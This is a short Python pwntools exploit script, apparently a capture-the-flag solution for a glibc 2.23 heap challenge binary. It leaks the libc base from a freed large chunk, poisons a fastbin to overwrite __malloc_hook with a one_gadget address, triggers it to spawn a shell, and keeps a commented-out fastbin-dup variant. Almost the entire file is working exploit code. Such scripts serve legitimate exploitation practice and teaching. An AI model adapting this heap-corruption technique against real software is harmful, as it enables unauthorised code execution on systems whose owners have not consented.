from pwn import *

exe = ELF("./tmp_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe

def create(size, index):
    p.sendlineafter(b"choice:\n", b"1")
    p.sendline(f"{size}".encode())
    p.sendline(f"{index}".encode())

def view(index):
    p.sendlineafter(b"choice:\n", b"2")
    p.sendline(f"{index}".encode())

def edit(index, data):
    p.sendlineafter(b"choice:\n", b"3")
    p.sendline(f"{index}".encode())
    p.send(data)

def delete(index):
    p.sendlineafter(b"choice:\n", b"4")
    p.sendline(f"{index}".encode())

script = '''
b *create
b *edit
b *delete
'''

p = process("./tmp_patched")
#p = gdb.debug("./tmp_patched", gdbscript = script)

# FASTBIN POISON TO MALLOC HOOK
create(0x500, 0)
create(0x10, 2)
delete(0)
view(0)
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x3c4b78
print(hex(libc_base))

create(0x60, 0)
create(0x60, 1)
delete(0)
delete(1)
__malloc_hook = libc_base + libc.symbols['__malloc_hook']
edit(1, p64(__malloc_hook - 0x23))
create(0x60, 1)
create(0x60, 0)

one_shot = libc_base + 0xf1247
edit(0, b"A" * 0x13 + p64(one_shot))

create(0x0, 2)

# FASTBIN DUP
'''
create(0x10, 0)
create(0x10, 1)
delete(0)
delete(1)
delete(0)

create(0x10, 2)
create(0x10, 3)
create(0x10, 4)
'''
p.interactive()